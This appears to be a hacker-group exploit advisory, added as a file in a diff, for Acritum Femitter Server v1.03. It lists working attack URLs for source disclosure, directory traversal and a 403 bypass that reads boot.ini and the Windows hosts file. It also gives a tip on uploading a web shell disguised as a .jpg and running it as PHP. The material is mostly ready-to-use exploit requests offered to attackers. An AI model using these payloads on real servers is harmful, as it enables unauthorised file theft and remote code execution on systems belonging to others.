@@ -1,0 +1,81 @@
+--=> Tested on: XP sp 2
+
+
+Acritum Femitter Server v1.03 is a HTTP and  FTP Server for Windows.
+I came up with few vulnerabilities of this .. some vulns are already has been revelied but some are not 
+so lets have a look 
+
+
+*********************************************************************************************************************************
+HTTP Server
+-----------
+
+In the Femitter Server Application HTTP tab there are few options to choose, and vulnerability exploitation method will depends on it
+
+If the "Combined Server" is selected [Default Setting]
+----------------------------------------------------
+--== Source Disclosure Vulnerability==--
+even some files like .html will able to download from this vulnerability
+just put "." in the end of the file
+ 
+[+] http://192.168.1.101/index.htm. 
+
+
+--==Directory Traversal Vulnerability==--
+If the Femitter Server is installed in "Programe File" this will take you to the C Dir
+
+C: Dir
+------
+[+] http://192.168.1.101/..\../..\
+
+You can move in to dir by doing "../..\"
+
+but you won't be able to open the files there will be 403 Forbidden Error(still). this is a lame security option in the Femitter Server 
+
+
+
+*********************************************************************************************************************************
+
+Bypassing 403 Forbidden Error
+-----------------------------
+This is lame a security option . This can be easily bypass with hex . lets see how its done
+This c0de will give you permission to download anyfile 
+[+] http://192.168.1.101/\\..%2f..%2f..%2f..%2fboot.ini
+
+but if you wana open it in the browser you can add a "%<file.type> in the end
+--==403 Bypass Example==--
+
+[+] http://192.168.1.101/\\..%2f..%2f..%2f..%2fboot.ini%test.txt
+[+] http://192.168.1.101/\\..%2f..%2f..%2f..%2fwindows/system32/drivers/etc/hosts%test.txt
+
+********************************************************************************************************************************
+
+If the "Web Server (to show default doctument or 404 if it doesn't exsist" option is selected
+---------------------------------------------------------------------------------------------
+
+If this option is activated you might have trouble viewing the directory
+but still you will be able to see the file and download them 
+
+
+[+] http://192.168.1.101/\\..%2f..%2f..%2f..%2fboot.ini%test.txt
+
+and also this will open it as a readable file on the browser
+
+[+] http://192.168.1.101/\\..%2f..%2f..%2f..%2fboot.ini% ../
+
+
+pluse you can use the above application to view unreadable files like .dll .exe .
+files like .dll .exe will not be open with %text.txt .. this doesnt make sense right
+eventho .dll .exe is not readable this vulnerability can be quite usefull sometime ..
+
+********************************************************************************************************************************
+Tips 
+
+you can upload a shell renamed .jpg and you will be able to execute it in php like this 
+
+http://192.168.1.101/evilshell.jpg%owned.php
+*********************************************************************************************************************************
+
+[+] Site      : http://lkhackers.com
+[+] Email/Msn : zer0_thunder@colombohackers.com
+=================================================================================================================================
